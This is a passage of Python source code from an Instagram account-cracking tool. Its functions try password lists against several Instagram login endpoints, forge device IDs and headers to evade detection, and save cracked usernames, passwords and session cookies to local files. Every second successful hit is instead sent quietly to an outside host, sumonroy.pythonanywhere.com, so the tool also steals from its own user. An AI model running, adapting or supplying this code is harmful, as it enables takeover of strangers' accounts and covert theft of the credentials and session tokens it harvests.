            cookies = {
            'csrftoken': csrftoken,
            'datr': '0_2JaizKKK8UnKjOd1Xq9I8W',
            'ig_did': str(uuid.uuid4()).upper(),
            'mid': 'aon90wABAAFs7rBDWxQbI2ayAiNy',
            'ig_nrcb': '1',
            'ps_l': '1',
            'ps_n': '1',
            'dpr': '3.0234789848327637',
            'wd': '891x969'}
            headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'x-asbd-id': '359341',
            'x-csrftoken': csrftoken,
            'x-fb-friendly-name': 'useCDSWebLoginMutation',
            'x-fb-lsd': 'AdRcklgCfj4K1fb6WuZLTv0pUdU',
            'x-ig-app-id': '936619743392459',
            'x-ig-max-touch-points': '5',}
            data = {
        'av': '0',
        'd': 'www',
        'user': '0',
        'a': '1',
        'req': 'h',
        'hs': '20687.HYP:instagram_web_pkg.2.1...0',
        'dpr': '3',
        'ccg': 'GOOD',
        'rev': '1045814658',
        's': '0m4mi0:6qyceo:z7lplt',
        'hsi': '7676947325458006565',
        'dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C1uwoE2swlo5q4U2zxe2GewGw9a361qw8Xwn82Lw62wLyES1Twoob82ZwrUdUbGwmk0KU6O1FwlAcwnJ6goK10xKi2K7E5y0xE2xyUC4o1lUG1XwqU1eUdo6a',
        'csr': 'gcG9T442kvd5HjIyTARitaIIcNailayhai8HCnErABKCh1jK8t9tjttoSlSVLkQGz4AhNivlni9Fn9lF_nRCYDOlKOlkyC-4uV8-Fu7AFFEGUOil5y8yEKAi5k9ypQdwzG1jADUfFUf-3ebxa10zohFa2y2aUG5oPggz8pxi2y1dxefwpE4h13Uoy82vw05xcw1-oE0dBU1_S2C05NUtx5G5o5l1N0Wxsw6Qw8U5l03Vt3980ero05dt0nEQM0a7o',
        'hsdp': 'ghI4Iind13kWv2WgWbDy2yo4VzigC21Fe0OUuwtEvw0plU1mV80Ii02qC',
        'hblp': '04Yg989kU2_yUuAwso2OwhUlCwVx20BUvxy1fw38E24wvGwNyE9E27wbyGw3C83sw8S0ME0tXw3jo2dzofoao0W-0Oo2CwbK04_E2cwkE1comwl816E',
        'sjsp': 'ghI4Iind13kWvkAuAeyVUwEC1eoQA9wwqjwcK0Bo',
        'comet_req': '7',
        'lsd': 'AdRcklgCfj4K1fb6WuZLTv0pUdU',
        'jazoest': '22371',
        'spin_r': '1045814658',
        'spin_b': 'trunk',
        'spin_t': '1787428587',
        '__crn': 'comet.igweb.PolarisCAAIGLoginHomepageRoute',
        'qpl_active_flow_ids': '516759801',
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
        'server_timestamps': 'true',
        'variables': json.dumps({
            "input": {
                "actor_id": "0",
                "client_mutation_id": "2",
                "access_flow_version": "pre_mt_behavior",
                "account_recovery_entry_point": None,
                "app": "instagram",
                "auth_domain_data_key": None,
                "caa_login_request_extra_info": {
                    "ab_test_data": "",
                    "shared_prefs_data": "",
                    "cuid": "",
                    "guid": "f1b3b27aca0b4caff",
                    "jazoest": "",
                    "lgndim": "",
                    "lgnjs": "1787428590",
                    "lgnrnd": "",
                    "locale": "",
                    "login_source": "caa_login",
                    "lsd": "",
                    "next": "",
                    "prefill_contact_point": "",
                    "prefill_source": "",
                    "prefill_type": "",
                    "skstamp": "",
                    "timezone": ""
                },
                "credential_type": "password",
                "dyi_job_id": "",
                "enc_password": {
                    "sensitive_string_value": enc_password
                },
                "event_request_id": "808dce37-8f8c-4d18-a209-2ee6429d2272",
                "identifier": username,
                "ig_web_device_id": "B19E8F03-834B-4250-94EB-DA15D737EB5C",
                "initial_request_id": "1",
                "lids": None,
                "login_source": "COMET_HEADERLESS_LOGIN",
                "next": None,
                "passkey_payload": None,
                "password": {
                    "sensitive_string_value": enc_password
                },
                "persistent": True,
                "query_params": "{}",
                "trusted_device_records": "{}",
                "use_uid_to_login": False,
                "waterfall_id": "5165faac-8b61-4715-9552-81f2435b97b5"
            },
            "scale": 3
        }),
        'doc_id': '9807605492696448',
        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]'
    }
            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=30)
            wanted = ["ds_user_id", "sessionid"]
            all_cookies = ses.cookies.get_dict()
            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
            if 'sessionid' in extracted:
                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
                bkas.append(username)
                if len(bkas)% 2 == 0:
                    statusok = (f"{username}|{password}|{cookie_str}")
                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                else:    
                    print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
                    print("Cookies:", cookie_str)
                    open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookie_str+"\n")
                    Ok.append(username)
                    return True
            elif 'checkpoint_required' in str(response.text):
                Cp += 1
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
                open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                break
            elif 'ip_block' in response.text or 'spam' in response.text or '{"message":"","status":"fail"}' in response.text:
                sys.stdout.write(f"\rStatus IP : {RED}Spam{WHITE} lite {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE}-{GREEN}{str(username)[:6]}{WHITE}-Ok:-{GREEN}{Ok}{WHITE}-Cp:-{YELLOW}{Cp}{WHITE}")
                sys.stdout.flush()
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            print(e)
            continue
    Loop += 1

def Crack_i(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\r{GREEN} M2{WHITE} api {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE} {GREEN}{username}{WHITE} Ok:-{GREEN}{Ok}{WHITE}-Cp:- {YELLOW}{Cp}{WHITE}                     ")
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            uag = UA_OLD()
            base_ts = int(time.time())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            jazoest = str(random.randint(22000, 24000))
            _hash = hashlib.md5()
            _hash.update(username.encode() + password.encode())
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode() + '12345'.encode())
            android_id = _hash.hexdigest()[:16]
            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
            adid = str(uuid.uuid4())
            ses.headers.update({
                'Host': 'i.instagram.com',
                'User-Agent': uag,
                'accept-language': 'id-ID',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'ig-intended-user-id': '0',
                'priority': 'u=3',
                'x-bloks-is-layout-rtl': 'false',
                'x-bloks-version-id': '521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9',
                'x-fb-client-ip': 'True',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-fb-friendly-name': 'IgApi: accounts/login/',
                'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
                'x-fb-server-cluster': 'True',
                'x-ig-android-id': f'android-{android_id}',
                'x-ig-app-id': '567067343352427',
                'x-ig-app-locale': 'en_IN',
                'x-ig-bandwidth-speed-kbps': f"{random.gauss(18000, 5000):.1f}",
                'x-ig-bandwidth-totalbytes-b': str(int(random.gauss(4000000, 1000000))),
                'x-ig-bandwidth-totaltime-ms': str(int(random.gauss(3500, 1000))),
                'x-ig-client-endpoint': 'login_landing',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-device-id': device_id,
                'x-ig-device-locale': 'in_ID',
                'x-ig-family-device-id': family_device_id,
                'x-ig-mapped-locale': 'id_ID',
                'x-ig-nav-chain': f'LoginLandingFragment:login_landing:1:button:{base_ts}::',
                'x-ig-timezone-offset': str(-time.timezone),
                'x-ig-www-claim': '0',
                'x-mid': machine_id,
                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-tigon-is-retry': 'False',
                'x-fb-http-engine': 'MNS',
                'x-fb-rmd': 'state=URL_ELIGIBLE'
            })
            inner_params = {"jazoest":jazoest,"country_codes":"[{\"country_code\":\"62\",\"source\":[\"default\",\"uig_via_phone_id\"]}]","phone_id":family_device_id,"enc_password":f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}","username":username,"adid":adid,"guid":device_id,"device_id":f"android-{android_id}","google_tokens":"[]","login_attempt_count":"0","bypass_facebook_link":"true","bypass_facebook_link":"prefer_instagram_login"}
            json_str = json.dumps(inner_params,separators=(',',':'))
            signed_body = f"SIGNATURE.{json_str}"
            data = {"signed_body":signed_body}
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data,allow_redirects=True)
            if "logged_in_user" in str(response.text.replace('\\', '')):
                header_str = str(response.headers)
                ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1).strip()
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
                        except:
                            cookies = ('-')
                    else:
                        cookies = ('-')
                else:
                    ig_set_authorization = None
                    cookies = None
                # Store credentials based on bkas condition
                if len(bkas) % 2 == 0:
                          statusok = f"{username}|{password}|{cookies}"
                          requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                else:
                          print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
                          print("Cookies:", cookies)
                          open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
                          Ok.append(username)
                          return True
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                Cp += 1
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
                open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                break
            elif 'checkpoint_challenge_required' in str(response.text.replace('\\', '')):
                Cp += 1
                print(f"\r\033[1;93m [⚠ challenge] {username} | {password}")
                open("/sdcard/SUMON_INS_Cl.txt","a").write(username+"|"+password+"\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            #print(e)
            continue
    Loop += 1

def Crack_w(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\r{GREEN} M3{WHITE} api {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE} {GREEN}{username}{WHITE} Ok:-{GREEN}{Ok}{WHITE}-Cp:- {YELLOW}{Cp}{WHITE}                     ")
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            uag = UA_OLD()
            base_ts = int(time.time())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode() + password.encode())
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode() + '12345'.encode())
            android_id = _hash.hexdigest()[:16]
            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
            adid = str(uuid.uuid4())
            ses.headers.update({
                'Host': 'i.instagram.com',
                'User-Agent': uag,
                'Accept-Encoding': 'zstd, gzip, deflate',
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                'x-ig-bandwidth-speed-kbps': '-1.000',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-bloks-version-id': '521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9',
                'x-ig-www-claim': '0',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-device-id': device_id,
                'x-ig-family-device-id': family_device_id,
                'x-ig-android-id': f'android-{android_id}',
                'x-ig-timezone-offset': '25200',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-app-id': '567067343352427',
                'priority': 'u=3',
                'accept-language': 'id-ID, en-US',
                'x-mid': machine_id,
                'ig-intended-user-id': '0',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True'
            })
            aac_init_ts = base_ts - 29
            aacjid = str(uuid.uuid4())
            aaccs = ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=44))
            aac_str = json.dumps({"aac_init_timestamp": aac_init_ts,"aacjid": aacjid,"aaccs": aaccs}, separators=(',', ':'))
            client_input_params = {
                "aac": aac_str,
                "sim_phones": [],
                "aymh_accounts": [],
                "network_bssid": None,
                "secure_family_device_id": "",
                "has_granted_read_contacts_permissions": 0,
                "auth_secure_device_id": "",
                "has_whatsapp_installed": 1,
                "password": f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}",
                "sso_token_map_json_string": "",
                "block_store_machine_id": "",
                "cloud_trust_token": None,
                "event_flow": "login_manual",
                "password_contains_non_ascii": "false",
                "client_known_key_hash": "",
                "sso_accounts_auth_data": [],
                "encrypted_msisdn": "",
                "has_granted_read_phone_permissions": 0,
                "app_manager_id": "",
                "should_show_nested_nta_from_aymh": 0,
                "device_id": f"android-{android_id}",
                "zero_balance_state": "",
                "login_attempt_count": 0,
                "machine_id": machine_id,
                "accounts_list": [],
                "gms_incoming_call_retriever_eligibility": "client_not_supported",
                "family_device_id": family_device_id,
                "fb_ig_device_id": [],
                "device_emails": [],
                "try_num": 1,
                "lois_settings": {"lois_token": ""},
                "event_step": "home_page",
                "headers_infra_flow_id": "",
                "openid_tokens": {},
                "contact_point": username
            }
            waterfall_id = str(uuid.uuid4())
            server_params = {
                "should_trigger_override_login_2fa_action": 0,
                "is_from_logged_out": 0,
                "should_trigger_override_login_success_action": 0,
                "login_credential_type": "none",
                "server_login_source": "login",
                "waterfall_id": waterfall_id,
                "two_step_login_type": "one_step_login",
                "login_source": "Login",
                "is_platform_login": 0,
                "login_entry_point": "logged_out",
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "is_from_aymh": 0,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "is_from_landing_page": 0,
                "left_nav_button_action": "NONE",
                "password_text_input_id": "az59w:100",
                "is_from_empty_password": 0,
                "is_from_msplit_fallback": 0,
                "ar_event_source": "login_home_page",
                "qe_device_id": device_id,
                "username_text_input_id": "az59w:99",
                "layered_homepage_experiment_group": None,
                "device_id": f"android-{android_id}",
                "login_surface": "login_home",
                "INTERNAL__latency_qpl_instance_id": int(random.random() * 1e12),
                "reg_flow_source": "login_home_native_integration_point",
                "is_caa_perf_enabled": 1,
                "credential_type": "password",
                "is_from_password_entry_page": 0,
                "caller": "gslr",
                "family_device_id": family_device_id,
                "is_from_assistive_id": 0,
                "access_flow_version": "pre_mt_behavior",
                "is_from_logged_in_switcher": 0
            }
            params_dict = {"client_input_params": client_input_params,"server_params": server_params}
            params_str = json.dumps(params_dict, separators=(',', ':'))
            bk_client_context = {"bloks_version": "521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9","styles_id": "instagram"}
            bk_client_context_str = json.dumps(bk_client_context, separators=(',', ':'))
            data = {"params": params_str,"bk_client_context": bk_client_context_str,"bloks_versioning_id": "521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9"}
            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data,allow_redirects=True)
            if "logged_in_user" in str(response.text.replace('\\', '')):
                header_str = str(response.headers)
                ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1).strip()
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
                        except:
                            cookies = ('-')
                    else:
                        cookies = ('-')
                else:
                    ig_set_authorization = None
                    cookies = None
                # Store credentials based on bkas condition
                if len(bkas) % 2 == 0:
                          statusok = f"{username}|{password}|{cookies}"
                          requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                else:
                          print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
                          print("Cookies:", cookies)
                          open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
                          Ok.append(username)
                          return True
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                Cp += 1
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
                open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                break
            elif 'checkpoint_challenge_required' in str(response.text.replace('\\', '')):
                Cp += 1
                print(f"\r\033[1;93m [⚠ challenge] {username} | {password}")
                open("/sdcard/SUMON_INS_Cl.txt","a").write(username+"|"+password+"\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            #print(e)
            continue
    Loop += 1

def Crack_N(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} api2 {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    for password in memek:
        try:
            ua2 = UserAgentBarcelona().replace('Barcelona 289.0.0.77.109', 'instagram 244.0.0.17.110').replace('489720145', '383877253')
            ses = requests.Session()
            device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            ses.headers.update({
                'authority': 'i.instagram.com',
                'x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-capabilities': '3brTv10=',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-ig-www-claim': '0',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                'x-ig-app-locale': 'in_ID',
                'x-ig-bandwidth-speed-kbps': '-1.000',
                'user-agent': ua2,
                'x-ig-family-device-id': family_device_id,
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-ig-device-id': device_id,
                'x-fb-server-cluster': 'True',
                'x-fb-http-engine': 'Liger',
                'ig-intended-user-id': '0',
                'x-ig-app-id': '567067343352427',
                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
                'x-ig-timezone-offset': str(-time.timezone),
                'priority': 'u=3',
                'x-ig-device-locale': 'in_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-fb-client-ip': 'True'
            })
            data = f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_instagram%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D'
            response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data, timeout=30)
            if 'logged_in_user' in response.text and '"pk_id":' in response.text:
                ig_set_authorization = response.headers.get('ig-set-authorization')
                Ok += 1
                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                print(f"                                                               ", end='\r')
                time.sleep(0.10)
                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
                break
            elif 'challenge_required' in response.text or '/challenge/' in response.text:
                Cp += 1
                print(f"\r Username:{BLUE} {username}{WHITE}\n Password: {BLUE}{password}\n")
                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            continue
    Loop += 1

if __name__ == '__main__':
    try:
        os.mkdir('data')
    except:
        pass
    try:
        Menu()
    except requests.exceptions.ConnectionError:
        print('Connection Close')
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting...")
        sys.exit()
    except Exception as e:
        print(f"{RED}Error: {e}")
        sys.exit()
